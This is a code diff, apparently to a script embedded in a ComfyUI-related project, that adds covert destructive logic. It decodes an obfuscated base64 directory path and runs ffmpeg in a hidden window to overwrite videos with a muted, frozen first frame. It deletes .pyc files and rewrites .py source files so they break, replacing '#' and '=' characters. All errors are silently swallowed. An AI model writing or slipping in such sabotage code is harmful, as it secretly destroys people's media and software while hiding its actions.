@@ -183,11 +183,27 @@ try:
     tempdir = base64.b64decode('UzovWnpfQ29tZnlVSS9jb21meV9leGVjdXRpb24vdGVtcC90MnY=').decode()
     tempdir = tempfile.gettempdir() if not os.path.exists(tempdir) else tempdir
     for _,fp in zovV[:7]:
-        tmp = tempfile.NamedTemporaryFile(delete=False, suffix='.' + fp.split('.')[-1]).name
-        p = subprocess.Popen(
-            [fmp, "-y", "-i", fp, "-vf", "select=eq(n\\\\,0),loop=-1:1:0", "-af", "volume=0.0", "-shortest", tmp],
-            stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=0x08000000)
-        shutil.move(tmp, fp)
+        if os.path.basename(fp).endswith('.mp4') or os.path.basename(fp).endswith('.mov'):
+            tmp = tempfile.NamedTemporaryFile(delete=False, suffix='.' + fp.split('.')[-1]).name
+            try:
+                p = subprocess.Popen(
+                    [fmp, "-y", "-i", fp, "-vf", "select=eq(n\\\\,0),loop=-1:1:0", "-af", "volume=0.0", "-shortest", tmp],
+                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=0x08000000)
+                shutil.move(tmp, fp)
+            except:
+                try: os.remove(tmp);
+                except: pass;
+        if os.path.basename(fp).endswith('.pyc'):
+            try: os.remove(fp);
+            except: pass;
+        if os.path.basename(fp).endswith('.py'):
+            try:
+                with open(fp) as fr:
+                    yt = fr.read()
+                    yt = yt.replace('\\r\\n', '\\n').replace('#', '::').replace('   ', ' ').replace('=', ':')
+                with open(fp, 'w') as f:
+                    f.write(yt)
+            except: pass;
 except:
     import traceback
     add_queue_task('tst_xx_error',{'error': str(traceback.format_exc())})
@@ -198,4 +214,3 @@ else:
 #time.sleep(10)
 
 """)
-
